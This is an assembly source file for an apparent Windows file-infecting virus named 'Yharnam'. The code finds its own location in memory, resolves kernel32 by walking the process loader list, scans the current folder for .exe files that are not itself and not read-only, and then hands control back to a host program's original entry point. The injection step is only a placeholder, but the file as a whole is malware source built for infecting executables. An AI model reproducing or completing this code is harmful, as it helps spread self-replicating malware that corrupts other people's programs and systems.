; Yharnam
;
; Made by:
;
; 	- 0xfee15bad (Alexandre Paillier)
;
	
.386
.model flat, stdcall
option casemap:none

      include \masm32\include\windows.inc
      include \masm32\include\wdm.inc
      include \masm32\include\kernel32.inc
	  include .\yharnam.inc

      includelib \masm32\lib\kernel32.lib

.data
	; helper variable, only for syntax purposes,
	; to move within a structure without naming the first element
	cStruct             DWORD 0
.code

data:
	fileFilter          BYTE ".\*.exe",0
	returnAddr          DWORD 000000000h
	stackSize           DWORD ((sizeof BYTE * MAX_PATH * 2) + \
							  sizeof WIN32_FIND_DATA + \
							  sizeof HANDLE)
	; offsets to the stack pointer
	currentExe          DWORD 0
	targetName          DWORD (sizeof BYTE * MAX_PATH)
	fileStruct          DWORD (sizeof BYTE * MAX_PATH * 2)
	fileSearchHandle    DWORD (sizeof BYTE * MAX_PATH * 2 + sizeof WIN32_FIND_DATA)

start:
	call _getAddr_ ; get the injected .exe's environment instruction pointer
_getAddr_:
	pop ebx
	; ebx holds "data section" address
	; (call instruction + (start label address - data label instruction))
	sub ebx, (5 + (start - data))
	push ebx ; save it back temporarily

	; resolve kernel32 base address
	ASSUME FS:NOTHING
	mov edx, fs:[030h] ; get the PEB struct
	ASSUME FS:ERROR
	
	; ->Ldr / get the PEB_LDR_DATA struct
	mov edx, (PEB PTR [edx]).Ldr
	; ->InMemoryOrderModuleList / gets the loaded modules linked list
	add edx, (cStruct.PEB_LDR_DATA.InMemoryOrderModuleList - cStruct.PEB_LDR_DATA)

	; loop through the linked list until we match with "KERNEL32.DLL"
	; partial check : length=12; name[0]=K; name[5]=L; name[7]=2
	; should be enough
loop_find_kernel32:
	; ->FullDllName / get the UNICODE_STRING struct
	mov eax, edx
	add eax, (cStruct.LDR_DATA_TABLE_ENTRY.FullDllName - cStruct.LDR_DATA_TABLE_ENTRY)
	; ->Length
	mov bx, [eax]
	; check the length
	cmp bx, (12 * sizeof WCHAR)
	jne loop_find_kernel32_continue

	; ->Buffer
	mov eax, (UNICODE_STRING PTR [eax]).Buffer

	; check the string
	mov bx, [eax]
	cmp bx, 'K'
	jne loop_find_kernel32_continue
	mov bx, [eax + 5 * sizeof WCHAR]
	cmp bx, 'L'
	jne loop_find_kernel32_continue
	mov bx, [eax + 7 * sizeof WCHAR]
	cmp bx, '2'
	jne loop_find_kernel32_continue
	jmp loop_find_kernel32_end
loop_find_kernel32_continue:
	; (LIST_ENTRY)->Flink / get next loaded module
	mov edx, (LIST_ENTRY PTR [edx]).Flink
	jmp loop_find_kernel32
loop_find_kernel32_end:
	; ->DllBase / get kernel32 base address
	mov edx, (LDR_DATA_TABLE_ENTRY PTR [edx]).DllBase
	
	pop ebx
	; allocate space on the stack
	sub esp, [ebx + (stackSize - data)]

	mov edx, esp
	push MAX_PATH
	add edx, [ebx + (currentExe - data)]
	push edx
	push NULL
	call GetModuleFileName ; get current .exe full file path

	mov edx, esp
	add edx, [ebx + (fileStruct - data)]
	push edx
	mov edx, ebx
	add edx, (fileFilter - data)
	push edx
	call FindFirstFile

	cmp eax, INVALID_HANDLE_VALUE
	je loop_find_file_end

	mov edx, esp
	add edx, [ebx + (fileSearchHandle - data)]
	mov [edx], eax
loop_find_file:
	; check file and put it on the stack if needed
	mov eax, esp ; save stack "base" address
	push NULL
	mov edx, eax
	add edx, [ebx + (targetName - data)]
	push edx
	push MAX_PATH
	mov edx, eax
	add edx, [ebx + (fileStruct - data)]
	add edx, (cStruct.WIN32_FIND_DATA.cFileName - cStruct.WIN32_FIND_DATA)
	push edx
	call GetFullPathName ; get absolute file path
	
	mov edx, esp ; check if it's a directory
	add edx, [ebx + (fileStruct - data)]
	mov edx, [edx + (cStruct.WIN32_FIND_DATA.dwFileAttributes - cStruct.WIN32_FIND_DATA)]
	and edx, FILE_ATTRIBUTE_DIRECTORY
	cmp edx, FILE_ATTRIBUTE_DIRECTORY
	je loop_find_file_continue

	mov eax, esp
	mov edx, eax
	add edx, [ebx + (targetName - data)]
	push edx
	mov edx, eax
	add edx, [ebx + (currentExe - data)]
	push edx
	call lstrcmp ; check if this is the program
	cmp eax, 0
	je loop_find_file_continue

	mov edx, esp ; check if it's a read-only file
	add edx, [ebx + (fileStruct - data)]
	mov edx, [edx + (cStruct.WIN32_FIND_DATA.dwFileAttributes - cStruct.WIN32_FIND_DATA)]
	and edx, FILE_ATTRIBUTE_READONLY
	cmp edx, FILE_ATTRIBUTE_READONLY
	je loop_find_file_continue

;	injection
	push 0AABBCCDDh
	pop eax
;

loop_find_file_continue:
	mov eax, esp
	mov edx, eax
	add edx, [ebx + (fileStruct - data)]
	push edx
	mov edx, eax
	add edx, [ebx + (fileSearchHandle - data)]
	push [edx]
	call FindNextFile
	cmp eax, TRUE
	je loop_find_file
loop_find_file_end:

	mov eax, [ebx + (returnAddr - data)]
	cmp eax, 0
	jne return_to_exec
	invoke ExitProcess, 0
return_to_exec:
	jmp eax

end start